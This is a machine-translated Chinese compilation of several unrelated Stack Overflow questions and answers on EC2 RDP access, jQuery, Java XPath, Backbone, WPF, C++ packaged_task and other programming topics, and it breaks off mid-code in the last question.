我在本地机器上使用 Hyper-V 创建了一个 VM，我可以将其 RDP 正常运行。我将 VHDX 导出到 VHD，然后通过 API 将其上传到 AWS。这为我创建了一个新的 EC2 实例，但我无法连接到它，因为它没有关联的安全密钥对。因此，我从该实例创建了一个私有 AMI，并从该 AMI 重新实例化了一个新的 EC2 实例，在此过程中设置密钥对以确保允许 HTTP、RDP 等。EC2 实例正在运行，但是当我下载 RDP 快捷方式时，如果连接失败。我已尝试多次重启实例（因为这是我搜索时建议的解决方案之一），但没有帮助。

我也无法通过公共 DNS 或私有 DNS ping 任何这些实例。

知道我做错了什么吗？我什至没有得到密码提示，它的连接是问题。

谢谢

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2014-08-28T18:20:15.317

我有一个类似的问题 - 这是帮助我解决它的 AWS 文档中的提示：

```
Verify that the route table for the subnet has a route that sends all traffic 
destined outside the VPC (0.0.0.0/0) to the Internet gateway for the VPC 
```

可以在此处找到有关此问题的其他调试提示：[远程桌面无法连接到远程计算机](http://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/troubleshooting-windows-instances.html#rdp-issues)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-06-14T09:59:46.323

在用户名类型中：

。\行政人员

....以及您的解密密码

看，这是本地用户。但是您不知道真正的本地主机名，这与公共 DNS 名称不同。

对我有帮助，希望对你也有帮助。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-01-15T20:21:18.910

问题可能是附加到实例的安全组配置。确保您允许入站 TCP 端口 3389 能够通过 RDP 进行连接。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-17T00:08:21.510

我猜你没有得到任何地方的原因与主机证书有关。

请注意，通过 RDP 连接到服务器的每台计算机都需要在 AWS 中有一个 IAM 用户，并将 X.509 证书上传到他们的账户。

导入或创建 Windows AMI 时，最好安装和配置 EC2Config 服务。

当您启动实例时，EC2 配置服务会执行以下操作：

在初始设置时：

*   将主机名设置为私有 DNS 名称
*   在管理员帐户上生成并设置随机密码
*   初始化和格式化临时磁盘
*   生成并安装用于终端
    服务的主机证书
*   将实例时钟与时间服务器同步

初始设置后：

*   将系统事件日志中的最后三个条目写入 Amazon EC2 控制台，以便您可以调试启动问题。
*   准备实例以进行捆绑

此外，默认情况下，安全组不允许您 ping 实例。您必须在安全组中启用 ICMP。

希望有帮助。

**编辑：**这是[EC2Config 安装程序的 64 位版本的链接](http://s3.amazonaws.com/ec2-windows-downloads/Ec2ConfigSetup_x64.msi)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-10T18:41:43.497

我也有同样的问题。这是我从 EC2 得到的。

公共 DNS ec2-23-22-109-251.compute-1.amazonaws.com

用户名管理员

密码我的密码

在远程桌面上，输入域和用户名 ec2-23-22-109-251\Administrator

如果您粘贴密码可能不起作用，请尝试粘贴它但重新输入最后 1 或 2 个字符。一旦您收到安全证书提示接受/安装它，您的连接应该很快就会打开。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-02-16T07:58:32.633

在我的服务器上修补 Windows 2019 后，尽管我的所有工作设置都没有更改，但我无法再访问该实例。我使用 EC2Rescue 解决了我的问题有关如何使用它的详细信息，请参阅下面的链接：[https ://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/troubleshoot-connect-windows-instance.html#AWSSupport -执行EC2Rescue](https://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/troubleshoot-connect-windows-instance.html#AWSSupport-ExecuteEC2Rescue)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-12-04T23:37:43.220

这对我有用：将您的手机用作“热点” - 它为您提供静态 IP 地址。那行得通。现在，我需要联系我的 Internet 提供商为我的无线路由器分配一个静态 IP。目前，它正在吐出 DHCP IP 地址。

更新：12.7.2016 您需要转到安全组，选择实例，然后编辑 RDP。如果您单击“MyIP”，这应该适用于我们这些在家工作的人。如果您在现场，您可能需要输入自定义 CIDR。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-10-03T17:58:04.290

重启 EC2 实例后，我发现我需要重新关联与实例关联的弹性 IP 地址。单击下面的按钮，然后在出现提示时选择实例和私有实例 IP 地址。

RDP 访问在此步骤后工作。

[![在此处输入图像描述](../Images/a9b455a88493ca777df41be47112e2aa.png)](https://i.stack.imgur.com/LnujH.png)

# jquery - Jquery选择菜单可见性问题

> ID：14346117
> 
> 赞同：1
> 
> 时间：2013-01-15T20:18:15.690
> 
> 标签：jquery, menu

我正在尝试为我的响应式网站创建第二个导航菜单。当小屏幕访问该站点时，应该会出现一个下拉菜单而不是完整菜单。我用来完成这项工作，但由于某种原因，选择菜单似乎没有出现。

这是我的 HTML：

```
 <nav class="container clearfix primary">
    <div class="sixteen columns">
        <ul>
            <li><a href="../index.html">home</a></li>
            <li><a href="../about.html">about</a></li>
            <li><a href="../services.html">services</a></li>
            <li><a href="../partners.html">partners</a></li>
            <li><a href="../research.html" class="selected">research</a>

                <ul>
                    <li><a href="extracts.html">Key Extracts & Findings</a></li>
                    <li><a href="contents.html">Report Contents</a></li>
                    <li><a href="segments.html">Mobile VUI Segments</a></li>
                    <li><a href="contributors.html">Participants & Contributors</a></li>
                    <li><a href="bibliography.html">Bibliography</a></li>
                </ul>

            </li>
            <li><a href="../contact.php">contact</a></li>
        </ul>
    </div>
</nav> 
```

这是我的jQuery：

```
$(document).ready(function() {

//build dropdown
$("<select />").appendTo(".primary div");

// Create default option "Go to..."
$("<option />", {
   "selected": "selected",
   "value"   : "",
   "text"    : "Go to..."
}).appendTo("nav select");

// Populate dropdowns with the first menu items
$(".primary div ul li a").each(function() {
    var el = $(this);
    $("<option />", {
        "value"   : el.attr("href"),
        "text"    : el.text()
    }).appendTo("nav select");
});

//make responsive dropdown menu actually work
$("nav select").change(function() {
    window.location = $(this).find("option:selected").val();
}); 
```

});

# java - pom 的 Java XPath 表达式

> ID：14346122
> 
> 赞同：1
> 
> 时间：2013-01-15T20:18:52.263
> 
> 标签：java, dom, xpath

java - xpath - pom.xml

我正在使用以下 pom.xml 文件作为 xml dom 资源，我想在`<version>`不迭代代码的情况下获取标记的值，这就是我使用 xpath 的原因，但我猜我的 xpath express 不正确，这就是它没有返回任何值的原因。**任何帮助表示赞赏**。

## 爪哇代码

```
 DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance();
    domFactory.setNamespaceAware(true);

    DocumentBuilder builder = domFactory.newDocumentBuilder();
    Document doc = builder.parse("C:\\projects\\pom.xml");
    XPath xpath = XPathFactory.newInstance().newXPath();

    XPathExpression expr = xpath.compile("project/version");
    Object result = expr.evaluate(doc, XPathConstants.NODESET);
    NodeList nodes = (NodeList) result;
    for (int i = 0; i < nodes.getLength(); i++) {
        System.out.println(nodes.item(i).getNodeValue());
    } 
```

## pom.xml

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.dc.app</groupId>
  <artifactId>rum</artifactId>
  <packaging>war</packaging>
  <version>12.54-SNAPSHOT</version>
  <name>rum</name>
  <description>rum</description>
</project> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T20:39:32.547

制作一个`javax.xml.NamespaceContext`并将其提供给您的 xpath：

```
xpath.setNamespaceContext(ctx); 
```

所以：

```
DocumentBuilderFactory domFactory = DocumentBuilderFactory
        .newInstance();
domFactory.setNamespaceAware(true);

DocumentBuilder builder = domFactory.newDocumentBuilder();
Document doc = builder.parse("blah.pom");
XPath xpath = XPathFactory.newInstance().newXPath();
Map<String, String> namespaces = new HashMap<String, String>();
namespaces.put("pom", "http://maven.apache.org/POM/4.0.0");

xpath.setNamespaceContext(
        new NamespaceContextImpl("http://maven.apache.org/POM/4.0.0", 
                namespaces));

XPathExpression expr = xpath.compile("/pom:project/pom:version");
Object result = expr.evaluate(doc, XPathConstants.NODESET);
NodeList nodes = (NodeList) result;
for (int i = 0; i < nodes.getLength(); i++) {
    System.out.println(nodes.item(i).getTextContent());
} 
```

产量：

```
12.54-SNAPSHOT 
```

编辑：命名空间上下文的实现：

```
public class NamespaceContextImpl implements NamespaceContext {
   private final Map<String, String> namespaces;
   private final String defaultNamespaceURI;

   public NamespaceContextImpl(String defaultNamespaceURI,
                               Map<String, String> namespaces) {
      this.defaultNamespaceURI = defaultNamespaceURI;
      this.namespaces = namespaces;
   }

   public Iterator getPrefixes(String namespaceURI) {
      throw new IllegalStateException("Not Implemented.");
   }

   public String getPrefix(String namespaceURI) {
      throw new IllegalStateException("Not Implemented.");
   }

   public String getNamespaceURI(String prefix) {
      if (prefix == null) {
         throw new IllegalArgumentException();
      }
      if (prefix.equals(XMLConstants.XMLNS_ATTRIBUTE)) {
         return XMLConstants.XMLNS_ATTRIBUTE_NS_URI;
      }
      if (prefix.equals(XMLConstants.XML_NS_PREFIX)) {
         return XMLConstants.XML_NS_URI;
      }
      if (prefix.equals(XMLConstants.DEFAULT_NS_PREFIX)) {
         return defaultNamespaceURI;
      }
      String result = namespaces.get(prefix);
      if (result == null) {
         result = XMLConstants.NULL_NS_URI;
      }
      return result;
   }
} 
```

# javascript - 如何删除谷歌地图公司信息？

> ID：14346124
> 
> 赞同：1
> 
> 时间：2013-01-15T20:18:55.823
> 
> 标签：javascript, google-maps

我将在我的项目中使用谷歌地图。作为覆盖，我将使用带有街道的地图。

问题是，谷歌在这个覆盖上放置了很多我不需要的东西。

公司和某些方式的信息，最后它不仅是绘制的，它是可点击的，因此它会创建包含该点和 URL 的详细信息的信息窗口（如果存在）。

这是我不需要的。如何使用 Google Maps API 将其删除？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T21:25:51.987

您是在谈论从地图中删除各种对象的标签吗？如果是这样，那么您需要使用地图样式数组，然后将特定对象的可见性设置为关闭。例如，这个：

```
var styleArray = [
   {
    featureType: "poi.business",
    elementType: "labels",
    stylers: [
      { visibility: "off" }
    ]
  }
]; 
```

将关闭商业标签，这样您就看不到它们，也不再可以点击它们。您将创建如上所示的对象，然后将此对象设置为地图选项对象的“样式”属性，然后最终将其提供给您的地图：

```
 myOptions = {
          center: new google.maps.LatLng(38.955, -94.806),
          zoom: 13,
          minZoom:13,
          maxZoom:23,
          scaleControl:true,
          styles: styleArray,
          mapTypeId: google.maps.MapTypeId.ROADMAP
            };
        }

        map = new google.maps.Map(document.getElementById("map_canvas"),
            myOptions); 
```

# sql-server - 如何确定在事务提交之前我已经阅读了所有的 SQL 输出？

> ID：14346125
> 
> 赞同：0
> 
> 时间：2013-01-15T20:18:59.767
> 
> 标签：sql-server, vb.net, tsql

我有一个表，我一直想要从中获取所有数据（它是一个由另一个程序填充的缓冲区）。我还希望在阅读完这些数据后将其从表中删除。所以我有类似的东西

```
BEGIN TRANS T1;
DELETE FROM table_name OUTPUT DELETED.*;
COMMIT TRANS T1; 
```

在阅读器程序中，我使用 DataReader 循环遍历每一行。我担心的是，如果在读取这些数据时出现问题怎么办？比如说，线程崩溃了，我只读取了部分数据。如果这是一个事务，它是在什么时候提交的？我什么时候开始读？我宁愿暂时不要锁定这个表，因为有另一个程序总是试图写入它。

有没有更好的方法来做到这一点？我有一个程序不断地向这个表中写入一条又一条记录，我希望这个程序进入并获取它。我一次把它全部抓起来，这样我就可以使用 DELETE - OUTPUT DELETED，而不是一系列成本更高的“delete where”子句。我更喜欢作者和读者都可以不受干扰的方式。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:21:51.040

这种方法无法确定。

我会建议这样的事情。

1.  将要删除的记录移动到临时表。

2.  将临时表内容输出到应用程序

3.  从应用程序获取内容已处理的确认。

4.  从暂存表中删除内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T22:46:56.660

使 DataReader 崩溃并查看。

你可以使用 MSMQ 而不是 SQL 吗？

选项 A - 霍根 - 好答案

选项 B
有 PK 吗？
在哪里删除真的太昂贵了吗？
它摆脱了交易的需要。

选项 C
将 X（如 1000）的块（顶部）读入 .NET 集合而不是另一个表。删除 where ID in (....)

# c# - 数据库中可以为空但强制用户输入的字段

> ID：14346126
> 
> 赞同：1
> 
> 时间：2013-01-15T20:18:59.880
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, entity-framework, ef-code-first

如何实现以下场景： 我想要一个创建`userProfile`帐户的注册向导。在那种形式中，我有一个`companyName`（必需的）。然后，我将使用它`companyName`并在`companyInfromation`表格中开始记录。此表中的所有列都应该可以为空，因为我开始记录用户注册。

用户注册后，系统会提示他们需要完成公司信息的填写，因此他们将被带到公司信息表。

现在这是我的问题，我怎样才能使这个表单具有必需的属性并让用户填写所有必需的信息？（不仅仅是 JavaScript，还有 modelState 验证）我想到了一个 viewModel，但我得到了一堆“无法将类型 'project.model.companyinformation' 转换为 project.model.companyinformationviewmodel'”的错误。

我对 C#、asp.net MVC 很陌生。我过去只是采取简单的方法并使用 vb.net 和 asp.net 网络表单。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:22:39.953

创建模型是正确的方法。您不能从实体转换为模型。您需要自己传输数据。

```
var entity = GetEntity();
var model = new MyModelType();
model.ID = entity.ID;
model.OtherField = entity.OtherField; 
```

有一个名为[AutoMapper](http://automapper.codeplex.com/)的有用项目可以为您自动执行此操作。

另一种方法是创建自定义验证属性`RequiredIf`。这将验证指定的布尔字段是否具有 true 值：

```
public class MyModelType
{
    [NotMapped]
    private bool _enableFullValidation;

    [RequiredIf("_enableFullValidation")]
    public string MyNoneRequiredDBField { get; set; }
} 
```

# backbone.js - Backbone.js 路由器在放置时触发，而不是在发布时触发

> ID：14346129
> 
> 赞同：2
> 
> 时间：2013-01-15T20:19:22.257
> 
> 标签：backbone.js, backbone-routing

所以我一直在使用基本的 Backbone.js 创建一个简单的演示页面，它是一个基本的用户管理器。无论是创建（POST）还是更新（PUT）用户信息，我都会运行相同的功能。POST 和 PUT 请求都成功（IE 调用我的“成功”函数）但是只有 PUT 命令会触发路由器，POST 请求不会触发同一行代码，而它会触发成功函数。

下面是我的事件代码。saveUser 函数同时处理 PUT 和 POST 请求，但成功的路由器仅从成功的 PUT 请求触发，而不是从成功的 POST 请求触发（即使两者都成功更新数据库）。

```
events: {
            'submit .edit-user-form': 'saveUser',
            'click .delete': 'deleteUser'
        },
        saveUser: function (ev) {
            var userDetails = $(ev.currentTarget).serializeObject();
            var user = new User();
            reply = user.save(userDetails, {
                success: function (){
                    router.navigate('', {trigger: true});
                },
                error: function(){
                    $("#editError").toggle();
                    $("#editError").html("Error:<br/>"+reply.status+" : "+reply.statusText+"<hr/>");
                }
            });
            return false;
        },
        deleteUser: function (ev){
            $.ajaxSetup({
                headers: {
                    'method':"DeleteUser"
                }
            });
            reply = this.user.destroy({
                success: function (){
                    router.navigate('', {trigger: true});
                },
                error: function(){
                    $("#editError").toggle();
                    $("#editError").html("Error:<br/>"+reply.status+" : "+reply.statusText+"<hr/>");
                }
            })
            return false;
        } 
```

这是路由器代码：

```
 var Router = Backbone.Router.extend({
        routes:{
            'new': 'editUser',
            'edit/:id': 'editUser',
            '': 'home'
        }
    });
    var router = new Router();
    //ROUTES
    router.on('route:home', function(){
        alert("1");
        userList.render(),
        editUser.render({});
    });
    router.on('route:editUser', function(id){
        userList.render();
        editUser.render({id: id});
    });
    //NECESSARY
    Backbone.history.start();` 
```

任何帮助，将不胜感激！

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:46:16.747

问题是，当您创建新用户时，您已经在 url 处`""`，并且`router.navigate(newUrl)`只有`newUrl`在与当前页面 url 不同时才会触发。

请参阅[https://github.com/documentcloud/backbone/issues/652](https://github.com/documentcloud/backbone/issues/652)。

修复，改变

```
router.navigate('', {trigger: true}); 
```

至

```
Backbone.history.fragment = null; // Forces the current URL to be dirty
router.navigate('', {trigger: true}); // Now, Backbone thinks the new URL is different 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:48:58.863

当您发布时，当前 url 是“http://gocella.com/backbone/#”，在您发布后导航到“http://gocella.com/backbone/#”，这不会更改 url，它不会触发该事件。

路由器仅在 url 更改时触发事件，它从更新开始起作用，因为当您点击编辑时，您的 url 更改为“http://gocella.com/backbone/#/edit/1”，然后触发器又更改回“http ://gocella.com/backbone/#"

我认为使用路由器解决这个问题的方法总体上是不正确的。

你应该做更多的事情：当你点击保存时，创建一个新模型或使用表单值更新现有模型，然后使用`collection.create(modelFromForm)`，或者，如果你使用`model.save`，然后在成功回调中，将其添加到集合中

# wpf - 在 WPF 中，如何从绑定到 ListView 的集合视图源中的特定项目中获取命令参数？

> ID：14346130
> 
> 赞同：0
> 
> 时间：2013-01-15T20:19:25.827
> 
> 标签：wpf, listview, command, datatemplate, commandparameter

我的目标：右键单击我的 ListView 中的特定项目，弹出一个上下文菜单，选择一个命令，然后我根据选择的项目的上下文菜单运行一个函数。

我的 ListView 的 ItemsSource 绑定到 CollectionViewSource，其来源是“Items”的 ObservableCollection。(ListView, binds -> CollectionViewSource, source -> ObservableCollection of class "Item")

我试图做的是将一个通用的 ContextMenu 添加到列表视图中的所有“项目”中，并且当为列表视图中的项目选择上下文菜单项时，将运行一个命令。我能够让命令在一般情况下运行，但我无法获得有关选择上下文菜单的特定项目的任何信息/参数。

在此示例中，“Item”类有一个名为 host 的字符串，我想将 host 字符串传递给 RefundRequestCommand，但我无法传递任何 CommandParameters。

我已经阅读了一些关于创建和使用数据模板的内容，但没有成功。任何人都可以指导我/帮助我吗？

这里有一些代码供参考：

列表显示：

```
<ListView x:Name="ordersList" Margin="0,10,10,0" BorderThickness="2" Grid.Column="2" Grid.Row="0" Grid.RowSpan="2" HorizontalAlignment="Stretch" ItemsSource="{Binding Source={StaticResource cvsOrders}}" SelectionChanged="ordersList_SelectionChanged" SelectedIndex="0" SelectionMode="Extended">
            <ListView.Resources>
                <local:RefundRequestCommand x:Key="refund"></local:RefundRequestCommand>
            </ListView.Resources>
            <ListView.ContextMenu>
                <ContextMenu>
                    <MenuItem Header="test" Command="{StaticResource refund}" CommandParameter="{Binding host}"></MenuItem>
                </ContextMenu>
            </ListView.ContextMenu>
            <ListView.View>
                <GridView>
                    <GridViewColumn Width="140">
                        <GridViewColumnHeader Name="OrderNumber" Click="sortClick" Tag="orderNumber" Content="Order Number" />
                        <GridViewColumn.CellTemplate>
                            <DataTemplate>
                                <TextBlock Text="{Binding orderNumber}" TextAlignment="Center"/>
                            </DataTemplate>
                        </GridViewColumn.CellTemplate>
                    </GridViewColumn>
        //On and On..... 
```

命令：

```
class RefundRequestCommand : ICommand
{
    TreeViewFilter treeViewFilter;

    public void Execute(object parameter)
    {
        string host = (string)parameter;
        Console.WriteLine(host);  //FOR TESTING
    }

    public bool CanExecute(object parameter)
    {
        return true;
    }

    public event EventHandler CanExecuteChanged;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T02:27:39.910

实际上，您正在为 ListView 设置 ContextMenu，但您想将 ListViewItem 传递到那里。您应该为 ListViewItem 设置上下文菜单。尝试这个。

```
<local:RefundRequestCommand x:Key="refund"/>

    <Style x:Key="MyLVItemStyle" TargetType="ListViewItem">
        <Setter Property="ContextMenu">
            <Setter.Value>
                <ContextMenu>
                    <MenuItem Header="test" 
                              Command="{StaticResource refund}" 
                              CommandParameter="{Binding host}">
                    </MenuItem>
                </ContextMenu>
            </Setter.Value>
        </Setter>
    </Style> 
```

并像你一样使用它

```
 <ListView x:Name="ordersList" Margin="0,10,10,0" BorderThickness="2" Grid.Column="2" Grid.Row="0" Grid.RowSpan="2" HorizontalAlignment="Stretch" 
              ItemsSource="{Binding Rectangles}" SelectedIndex="0" SelectionMode="Extended" ItemContainerStyle="{StaticResource MyLVItemStyle}">
...... 
```

您还删除了 ListView 中应用的样式，它应该可以工作。

# xcode - 如何按名称的字母顺序对故事板的视图控制器进行排序或在故事板中快速定位 VC？

> ID：14346138
> 
> 赞同：2
> 
> 时间：2013-01-15T20:20:03.147
> 
> 标签：xcode, sorting, storyboard, document, outline

当您打开情节提要并展开“文档大纲”时，通过单击左下角的箭头，您将获得情节提要中的视图控制器列表。您还可以通过单击任何视图控制器来获取此列表，然后在顶部单击并按住倒数第二个节点。

两个视图控制器列表均未排序。我的故事板中有 100 多个视图控制器，如果我忘记了确切的名称，需要一段时间才能找到合适的视图控制器。有谁知道如何从类名快速跳转到情节提要中的视图控制器，或者按名称的字母顺序对“文档大纲”视图或顶部的视图控制器列表进行排序？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:55:01.653

如果您知道视图控制器的名称，您可以在文档大纲最底部的空白处键入它。它里面有一个小半圈。如果您不知道全名，请输入类似的内容，它会列出具有相似标题的 VC。希望这可以帮助你。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-12-15T17:45:31.277

[Douglas](https://stackoverflow.com/users/1358571/douglas)建议使用过滤功能。这不是 OP 最初要求的，但它可以是一个足够的功能替代品。

从 XCode 7 开始，似乎没有一种对故事板友好的方式来重新排列它。但是，可以[编辑与故事板关联的 XML](https://stackoverflow.com/a/26815142/2714641)以重新排列这些场景：

> 这可以通过情节提要 xml 来完成。只需右键单击故事板并将其以 xml 格式打开。您应该能够看到标签“场景”，其中包含视图控制器的“场景”。“场景”标签下显示的顺序与您在文档大纲下看到的顺序相对应。
> 
> 正如您可能假设的那样，只需将整个“场景”内容复制粘贴到您希望在文档大纲中看到它的位置。

# php - 为什么当我在我的 wamp 服务器上使用 htmlentities() 时它运行良好，但在别人的服务器上却有奇怪的字符？

> ID：14346142
> 
> 赞同：0
> 
> 时间：2013-01-15T20:20:20.370
> 
> 标签：php

我正在提取未指定编码的 XML 提要。我无法在提要上更改此内容。当我使用 htmlentities() 时，它会为我的 WAMP 服务器上的某些字符提供正确的输出，但是当我将其上传到另一台服务器时，似乎某些字符的编码不正确，例如打开和关闭双引号（不仅仅是“但看起来像 66 和 99 的那个）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:21:57.467

其他人的服务器可能有不同的编码。您可以指定编码以与其他人的服务器兼容。

> Like `htmlspecialchars()`,`htmlentities()`接受一个可选的第三个参数 encoding ，它定义了转换中使用的编码。如果省略，则此参数的默认值在 PHP 5.4.0 之前的版本中为 ISO-8859-1，从 PHP 5.4.0 开始为 UTF-8。

[请参阅文档](http://php.net/manual/en/function.htmlentities.php)

# model-view-controller - 模型关系的 MVC 创建/更新操作

> ID：14346146
> 
> 赞同：1
> 
> 时间：2013-01-15T20:20:38.723
> 
> 标签：model-view-controller, design-patterns

这是我拥有的数据库的示例结构：

![在此处输入图像描述](../Images/9b645b402f22e871880e792d4812c26b.png)

在学生视图表单中，我添加了表单以添加文件。

在学生控制器中，当我创建或更新条目时，我管理文件上传和文件数据库条目的创建。

我想知道的是，在 MVC 设计模式中，这样做的正确方法是什么？是不是我的学生控制器必须知道我的文件模型的完成方式并且必须知道如何添加文件？

或者最好的方法是在我的学生控制器中调用文件控制器的添加或更新操作？但是这样，我是否打破了 MVC ？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:52:58.517

破坏 MVC 的方式：

*   控制器负责应用程序逻辑，甚至可能是持久性（它应该只改变模型层和视图的状态）
*   模型不是任何单个类，它是由具有不同职责的不同类组成的层（没有“文件模型”或“学生模型”）

在最好的情况下，控制器将没有来自数据的反馈，它传递给模型层（最好通过一些服务，这将处理带有域模型层的应用程序逻辑）。

相反，当视图实例开始为用户组装响应时，它会检查模型的状态（再次通过服务），看看是否有什么变化。在上传的情况下，这将是视图发现上传结果并根据数据决定如何响应的点。通常在文件上传的情况下，响应将只包含一个 HTTP 位置标头。

> [我假设您根据您的个人资料历史记录在 Web 环境中谈论 MVC。在经典的 MVC 中，视图会知道模型层的变化，而无需显式检查它，因为那里使用了观察者模式。]

虽然您很可能会有一些“上传控制器”，但它不应该直接与域对象或存储抽象交互。相反，它只接受用户的请求，从中提取数据并将其传递到需要去的地方。

> [请记住，在 Web 应用程序中，“用户”是 Web 浏览器，而不是使用它的人。]

# java - 使用 HP SOA Systinet Java API 上传 WSDL 文件

> ID：14346149
> 
> 赞同：2
> 
> 时间：2013-01-15T20:20:50.553
> 
> 标签：java, api, wsdl

有人知道如何做到这一点吗？

我可以创建 wsdlArtifacts、businessServiceArtifacts、webServiceArtifacts 等，但是我不能上传 WSDL 文件，我希望有与 Systinet 接口相同的行为，即文件被解析并自动操作、端点、WSDL 工件创建的。我不想解析 WSDL 文件来创建它们。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T21:33:01.463

禁用与 systinet 上的 WSDL 工件关联的解析策略。

# c# - 了解属性具有多个验证属性的模型中的有效性

> ID：14346150
> 
> 赞同：0
> 
> 时间：2013-01-15T20:20:52.633
> 
> 标签：c#, asp.net, asp.net-mvc, asp.net-mvc-3, custom-attributes

我正在开发一个 MVC 应用程序，我编写的一些模型代码的展开有点像这样：

```
public class SomeModel
{
    public int? CodeA { get; set; }
    public int? CodeB { get; set; }

    [RequiredIf("CodeA", 3, ErrorMessage = "(required for [Something]!)")]
    [RequiredIf("CodeB", 99, ErrorMessage = "(required for [Other]!)")]
    public string Foo { get; set; }

    // SNIP: Unimportant details
} 
```

注意：`RequiredIf()`我正在使用的实现可以在[这里](http://blogs.msdn.com/b/simonince/archive/2010/06/04/conditional-validation-in-mvc.aspx)找到。

我用两个RequiredIf() 属性修饰了属性Foo，用户可以在某些情况下对其进行编辑。有两种不同的情况需要填写。在所有其他情况下，前端将解析用户的输入并在“幕后”为他们填充。

问题：如果*只满足一种*情况（例如 CodeA = 3，CodeB = 4），并且用户未能输入任何内容从而导致否定验证，那么模型是否仍会被标记为 Invalid 并为其记录 ErrorMessage ？或者，由于满足 Code B 条件，如果 CodeA 处于需要（而不是输入）的状态，是否会覆盖执行的验证？

另一种提问方式：验证是附加的，还是一次只有一个验证的结果有隐含限制？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:44:31.517

验证是否定的。为了通过验证，所有验证者都必须确认该字段有效。因此，对于您的`Foo`，如果`CodeA`验证器通过并且`CodeB`验证器失败，则验证将失败。Modelstate 将包含该字段的单个错误。如果两者都失败，modelstate 将包含该字段的两个错误。

# yahoo - Yahoo Finance Api - 缺少符号数据

> ID：14346151
> 
> 赞同：0
> 
> 时间：2013-01-15T20:20:53.390
> 
> 标签：yahoo, finance

我正在使用 Yahoo Finance Api 提取库存率。[使用Yahoo Finance](http://finance.yahoo.com/)查找符号- 但奇怪的是，Yahoo 提供的一些符号在使用 API 时不返回任何数据？！

以下是一些示例（尝试使用上面的 url 查找它们）：

*   DKIEUIXBNP.CO
*   DKIENGKEUO.CO
*   DKIGLOIXVAKK.CO

但是在尝试提取数据时。这个符号似乎是未知的。

[API-txt-文件-下载](http://finance.yahoo.com/d/quotes.txt?s=DKIEUIXBNP.CO,DKIENGKEUO.CO,DKIGLOIXVAKK.CO&f=sl1c1p2bahgvd1)

使用 YQL，它显示“未知股票代码”

[YQL 示例](http://query.yahooapis.com/v1/public/yql?q=select%20%2a%20from%20yahoo.finance.quotes%20where%20symbol%20in%20%28%22DKIGLOIXVAKK.CO%22%29&env=store://datatables.org/alltableswithkeys)

为什么，为什么？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T17:37:11.067

我不会使用 yahoo YQL，而是使用返回 CSV 的旧 Web 服务。[我在 Grails 框架上有一个名为yahoofinance](https://github.com/ibaralf/yahoofinance)的开源插件，它从 yahoo Finance 获取股票数据。我测试了您的股票代码，它确实返回了响应，但正如我所说，由于这些特定股票的交易数据非常低，返回的数据大多为 0.0 和 N/A

尝试使用雅虎网络服务（使用示例符号）

```
finance.yahoo.com/d/quotes.csv?s=DKIENGKEUO.CO&f=snl1d1t1cc1p2pohgvmlt7a2ba 
```

-> f=snl1d1t1cc1p2pohgvmlt7a2ba，代表您请求的统计信息。

# c++ - 将 std::packaged_task 包装在自定义类中

> ID：14346152
> 
> 赞同：4
> 
> 时间：2013-01-15T20:20:59.077
> 
> 标签：c++, c++11, packaged-task

我正在尝试将 std::packaged_task 包装在另一个类中，以便与任务调度程序一起使用。

目前，除了 std::future 支持外，我一切正常。为了获得 std::future 支持，我发现我需要将 std::packaged_task 用于它提供的 get_future() 函数。

我整天都在尝试各种方法来让它工作，但我似乎无法使用来自 std::bind 的返回值正确声明和初始化 packaged_task。我试图破译所有相关 libstdc++ 函数的实现，例如 std::async、std::future、std::thread 等，但没有运气。

以下代码是非工作版本和工作版本的实现。要使其正常工作，请取消注释两个 /* --- WORKS*/ 并注释其他相关行。

```
#include <vector>
#include <deque>
#include <memory>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <future>
#include <iostream>
#include <chrono>
#include <functional>

#include <windows.h>

class task
{
private:
    struct task_implementation_base
    {
        virtual void execute() = 0;
    };

    template <class callable>
    struct task_implementation : public task_implementation_base
    {
        task_implementation(callable&& f) : /*m_task(std::forward<callable>(f)) WORKS*/m_task(f) { }
        void execute() { m_task(); }

        //callable m_task; // WORKS
        std::packaged_task<typename result_of<callable>::type> m_task;
    };

    template <class callable>
    std::shared_ptr<task_implementation<callable>> make_routine(callable&& f)
    {
        return std::make_shared<task_implementation<callable>>(std::forward<callable>(f));
    }

public:
    template <class callable, class... arguments>
    task(callable&& f, arguments&&... args) : m_function(make_routine(std::bind(std::forward<callable>(f), std::forward<arguments>(args)...))) {}

    void operator()() { run(); }

    void run() { m_function->execute(); }

private:
    std::shared_ptr<task_implementation_base> m_function;

};

int testint(int i)
{
